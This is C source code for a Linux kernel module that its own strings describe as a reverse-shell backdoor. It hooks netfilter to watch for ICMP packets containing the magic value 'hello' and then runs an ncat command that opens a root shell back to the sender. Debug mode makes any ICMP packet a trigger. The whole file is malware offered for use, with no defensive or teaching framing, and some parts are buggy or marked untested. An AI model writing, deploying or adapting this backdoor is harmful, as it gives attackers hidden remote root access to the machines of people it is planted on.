/*
* main.c - basic kernel module
*/
#include <linux/module.h>  // Needed by all kernel modules
#include <linux/kernel.h>  // Needed for KERN_INFO
#include <linux/init.h>    // Needed for macros
#include <linux/kmod.h>
#include <linux/moduleparam.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>

#include <linux/icmp.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/workqueue.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/interrupt.h>
#include <linux/hrtimer.h>

#include <linux/version.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <linux/udp.h>

// Move later to "conf.h" file!
#define DEBUG 1

#define MAGIC_VALUE "hello"
/////////////////////

// Change later:
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CyberName");
MODULE_DESCRIPTION("User mode reverse shell");
MODULE_VERSION("0.1");
//////////////////////////////


int reverse_shell_working = 0;
// global netfilter hook - used for registering hook
static struct nf_hook_ops *netf_hook = NULL;


void debugPrint(char *printMe) {
	#if DEBUG
	printk(printMe);
	printk("\n");
	#endif
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,4,0)
static void run_command_free_argv(struct subprocess_info *info){
    // should also clear any char * elements
    kfree(info->argv);
    reverse_shell_working = 0;
}
#endif

int run_command(char * command){
    struct subprocess_info *info;
    char * cmd_string;
    static char * envp[] = {
        "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL
    };

    char ** argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
    if(!argv) goto out;
    cmd_string = kstrdup(command, GFP_KERNEL);
    if(!cmd_string) goto free_argv;

    argv[0] = "/bin/sh";
    argv[1] = "-c";
    argv[2] = command;
    argv[3] = NULL;

    #if (LINUX_VERSION_CODE < KERNEL_VERSION(3,4,0)) && (LINUX_VERSION_CODE > KERNEL_VERSION(3,1,0))
    /* struct subprocess_info *call_usermodehelper_setup(char *path, char **argv,
     *                                                   char **envp, gfp_t gfp_mask)
     */
    info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL);
    #endif

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,4,0)
    /* struct subprocess_info *call_usermodehelper_setup(char *path, char **argv,
     *                char **envp, gfp_t gfp_mask,
     *                int (*init)(struct subprocess_info *info, struct cred *new),
     *                void (*cleanup)(struct subprocess_info *info),
     *                void *data)
     */
    info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL,
                                   NULL, run_command_free_argv, NULL);
    #endif
    if(!info) goto free_cmd_string;

    return call_usermodehelper_exec(info, 0); // 0 = don't wait
    
    free_cmd_string:
        kfree(cmd_string);
    free_argv:
        kfree(argv);
    out:
    	reverse_shell_working = 0;
      	return -ENOMEM;
}


void magic_command(char *IP) {
	char command[100];
	
	if (!reverse_shell_working) {
		reverse_shell_working = 1;
		debugPrint("Trying reverse shell");

		snprintf(command, 100, "/usr/bin/ncat %s 1234 --ssl -e /bin/sh", IP);
		// Us - listen like this: ncat -vklp 1234 --ssl
		debugPrint(command);
		run_command(command); // This command will give us reverse shell
	}
	else {
		debugPrint("Reverse shell already working!");
	}
	
}

// Search for ICMP Echo packets with the data "hello". 
// If found, create reverse shell to localhost.
// not tested.
unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	struct iphdr *ip_header;
	//const struct icmphdr *icmp_header;
	struct iphdr _iph;
	struct icmphdr _icmph;
	const char *data = NULL;
	char *_data;
	int size, str_size;
	char sourceIP[16];

	if (!skb)
		return NF_ACCEPT;

	ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);

	if (!ip_header || !ip_header->protocol)
		return NF_ACCEPT;

	if (ip_header->protocol == IPPROTO_ICMP && !reverse_shell_working) {
		snprintf(sourceIP, 16, "%pI4", &ip_header->saddr); // Mind the &!
		debugPrint("Got ICMP packet! (address one line down)");
		debugPrint(sourceIP);

		// Calculate where the data of the packet is...
		size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
		_data = kmalloc(size, GFP_KERNEL);

		if (!_data)
			return NF_ACCEPT;

		str_size = size - strlen(MAGIC_VALUE);

		data = skb_header_pointer(skb, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);

		if (!data) {
			kfree(_data);
			return NF_ACCEPT;
		}

		// Check if data of packet is our magic value (hello)
		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0 || DEBUG) {
			debugPrint("Got packet with magic!");
			magic_command(sourceIP); // Start reverse shell
			return NF_DROP;
		}
		
		debugPrint("Packet data is not magic.");
		return NF_ACCEPT;
	}

	return NF_ACCEPT;

	/*
	const struct iphdr *ip_header;
	const struct icmphdr *icmp_header;
	struct iphdr _iph;
	struct icmphdr _icmph;
	const char *data = NULL;
	char *_data;
	int size, str_size;

	if (!skb)
		return NF_ACCEPT;

	ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);

	// Make sure everything works
	if (!ip_header)
		return NF_ACCEPT;
	if (!ip_header->protocol)
		return NF_ACCEPT;

	// Check for IPID (maybe later!)
	// if (htons(ip_header->id) != IPID)
	// 	return ACCEPT;

	// Make sure we're ICMP
	if (ip_header->protocol == IPPROTO_ICMP) {
		icmp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_icmph), &_icmph);

		if (!icmp_header)
			return NF_ACCEPT;

		// Make sure it's ping
		if (icmp_header->code != ICMP_ECHO)
			return NF_ACCEPT;

		debugPrint("Got echo request! Checking for magic value.");
		// Check seq and win numbers! maybe later.
		// if (htons(icmp_header->un.echo.sequence) == SEQ &&
		//     htons(icmp_header->un.echo.id) == WIN) {

		// Calculate where the data of the packet is...
		size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
		_data = kmalloc(size, GFP_KERNEL);

		if (!_data)
			return NF_ACCEPT;

		str_size = size - strlen(MAGIC_VALUE);

		data = skb_header_pointer(skb, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);

		if (!data) {
			kfree(_data);
			return NF_ACCEPT;
		}

		// Check if data of packet is our magic value (hello)
		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {

			debugPrint("Got ICMP Packet with magic value!");

			if (!reverse_shell_working)
				start_reverse_shell("127.0.0.1", "1234");

			kfree(_data);

			// Drop the packet - we don't need to answer that
			return NF_DROP;
		}

		kfree(_data);
	}
	// }

	return NF_ACCEPT;
	*/
}

// Register our packets filter
// not tested.
static int register_icmp_listener(void)
{
	int ret;

	debugPrint("Registerig icmp_listener");
	netf_hook = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	/* set flags and function for netfilter */
	netf_hook->hook = (nf_hookfn*)icmp_listener;
	netf_hook->hooknum = NF_INET_LOCAL_IN;
	netf_hook->pf = PF_INET;
	netf_hook->priority = NF_IP_PRI_FIRST;

	/* register our netfilter hook */
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
		debugPrint("Linux version high");
    	ret = nf_register_net_hook(&init_net, netf_hook);
	#else
    	ret = nf_register_hook(netf_hook);
	#endif

	// ret = nf_register_hook(&netf_hook);
    debugPrint("Finished registration...");
    debugPrint("Testing...");
	if(ret < 0)
		return 1;

	return 0;
}

// Unregister our netfilter!!!
// Not tested.
void unregister_icmp_listener(void) {
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    	nf_unregister_net_hook(&init_net, netf_hook);
	#else
    	nf_unregister_hook(netf_hook);
	#endif
}

// Start module
static int __init start_module(void) {
	debugPrint(KERN_INFO "Started backdoor.");

	register_icmp_listener();
	return 0;
}

// Remove module
static void __exit stop_module(void) {
	unregister_icmp_listener();
	debugPrint(KERN_INFO "Stopped backdoor.");
}

module_init(start_module);
module_exit(stop_module);